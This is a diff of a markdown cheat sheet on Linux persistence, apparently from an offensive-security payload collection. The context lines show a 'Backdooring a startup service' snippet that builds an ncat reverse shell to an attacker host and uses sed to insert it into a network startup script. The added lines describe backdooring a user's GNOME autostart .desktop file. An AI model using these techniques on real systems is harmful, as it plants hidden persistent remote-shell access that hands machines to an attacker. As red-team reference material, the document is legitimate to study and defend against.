@@ -41,12 +41,27 @@ fi
 rm /tmp/$TMPNAME2
 ```
 
-
 ## Backdooring a startup service
 
 ```bash
 RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
+```
+
+## Backdooring an user startup file
+
+Linux, write a file in  `~/.config/autostart/NOM_OF_FILE.desktop`
+
+```powershell
+In : ~/.config/autostart/*.desktop
+
+[Desktop Entry]
+Type=Application
+Name=Welcome
+Exec=/var/lib/gnome-welcome-tour
+AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
+OnlyShowIn=GNOME;
+X-GNOME-Autostart-enabled=false
 ```
 
 ## Backdooring a driver
